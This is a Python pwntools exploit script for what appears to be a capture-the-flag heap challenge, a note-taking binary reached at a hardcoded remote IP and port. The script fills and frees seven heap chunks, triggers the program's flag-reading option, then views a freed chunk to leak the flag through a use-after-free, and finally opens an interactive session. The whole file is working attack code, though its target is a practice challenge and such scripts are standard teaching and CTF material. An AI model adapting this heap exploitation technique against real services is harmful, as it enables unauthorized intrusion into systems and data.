#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = 'main' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '178.128.218.40', 2004 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         NOTES
# =========================================================

def add(idx, payload):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b'?', payload)

def view(idx):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b':', str(idx).encode())

def delete(idx):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b':', str(idx).encode())

def read_flag():
    io.sendlineafter(b'> ', b'4')

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    for i in range(7):
        add(i, b'A'*120)

    for i in range(7):
        delete(i)

    read_flag()
    view(0)

    flag = io.recvuntil(b'}').decode()
    print(flag)
    io.sendlineafter(b'>', b'5')

    io.interactive()

if __name__ == '__main__':
    exploit()
